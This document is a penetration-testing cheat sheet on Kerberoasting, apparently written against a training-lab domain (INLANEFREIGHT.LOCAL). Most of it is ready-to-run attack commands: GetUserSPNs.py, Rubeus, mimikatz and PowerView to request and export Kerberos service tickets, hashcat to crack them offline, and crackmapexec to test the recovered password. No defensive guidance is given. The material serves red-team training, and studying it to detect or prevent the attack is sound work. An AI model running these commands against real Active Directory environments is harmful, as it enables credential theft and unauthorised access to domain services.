# Kerberoasting

When we send TGS-REQ to a KDC, it does not check if we have access to the service and provide us a TGS encrypted with the service account password hash.

A service account is an account that has at least one SPN attribute set.

**Kerberoasting technique = getting TGS from all accounts with SPN and crack it offline the recover password**

In most situations, services accounts are machine accounts, which have very complex, long, and random passwords. But if a service account, with a human-defined password, has a SPN set, attackers can request a ST for this service and attempt to crack it offline.

0\. Prerequisites :

* account's cleartext password (or NTLM hash) AND
* shell in the context of a domain user account OR
* SYSTEM level access on a domain-joined host

## From Linux

1. Listing all accounts with SPN

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

2. Request all TGS of SPN accounts

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request -outputfile all_tgs 
```

3. Request TGS of specific account

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

4. Saving TGS in output format

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

5. Crack TGS offline

```
sudo hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force


$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$81...:database!
```

6. Testing Authentication against a Domain Controller&#x20;

```
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

## From Windows

### 1st method using Rubeus

From a domain-joined machine :

```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

Crack it offline :&#x20;

```
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### 2nd method using mimikatz

1. Enumerating SPNs

```
setspn.exe : setspn.exe -Q /
```

2. Targeting a Single User

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

3. Retrieving all tickets

```
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

4. Extracting ticktes from memory

```
mimikatz # base64 /out:true
mimikatz # kerberos::list /export  
```

5. Crack it offline

```
echo "<base64 blob>" |  tr -d \\n 
cat encoded_file | base64 -d > sqldev.kirbi
python2.7 kirbi2john.py sqldev.kirbi
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

Cracking the Hash with Hashcat
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
$krb5tgs$23$*sqldev.kirbi*$81314...057feeab:database!
```

### 3rd method using Powerview

1. Using PowerView to Extract TGS Tickets&#x20;

```
Import-Module .\PowerView.ps1 
Get-DomainUser * -spn | select samaccountname
```

2. Using PowerView to Target a Specific User&#x20;

```
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

3. Exporting All Tickets to a CSV File&#x20;

```
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

4. Viewing the Contents of the .CSV File&#x20;

```
cat .\ilfreight_tgs.csv
```

